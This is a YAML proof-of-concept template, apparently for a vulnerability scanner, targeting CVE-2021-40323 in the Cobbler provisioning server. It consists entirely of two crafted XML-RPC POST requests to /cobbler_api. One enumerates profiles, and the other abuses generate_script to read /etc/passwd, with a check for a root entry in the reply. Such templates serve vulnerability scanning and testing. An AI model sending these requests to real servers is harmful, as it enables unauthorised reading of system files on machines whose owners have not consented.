name: poc-yaml-cobbler-cve-2021-40323-rce
binding: e4bdbdcb-b1ca-4c87-9101-9322756538df
manual: true
detail:
    author: Â∞èz
    links:
        - https://github.com/cobbler/cobbler/releases/tag/v3.3.0
    vulnerability:
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cobbler_api
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version='1.0'?>
                        <methodCall>
                          <methodName>find_profile</methodName>
                          <params>
                            <param>
                              <value>
                                <struct>
                                  <member>
                                    <name>name</name>
                                    <value>
                                      <string>*</string>
                                    </value>
                                  </member>
                                </struct>
                              </value>
                            </param>
                          </params>
                        </methodCall>
            follow_redirects: false
        expression: response.status == 200
        output:
            search: '"<value><string>(?P<profile>debian_8.*?)</string></value>".submatch(response.body_string)'
            profile: search["profile"]
    r1:
        request:
            cache: true
            method: POST
            path: /cobbler_api
            headers:
                Content-Type: text/xml
            body: |-
                <?xml version='1.0'?>
                        <methodCall>
                          <methodName>generate_script</methodName>
                          <params>
                            <param>
                              <value>
                                <string>{{profile}}</string>
                              </value>
                            </param>
                            <param>
                              <value>
                                <string></string>
                              </value>
                            </param>
                            <param>
                              <value>
                                <string>/etc/passwd</string>
                              </value>
                            </param>
                          </params>
                        </methodCall>
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: r0() && r1()
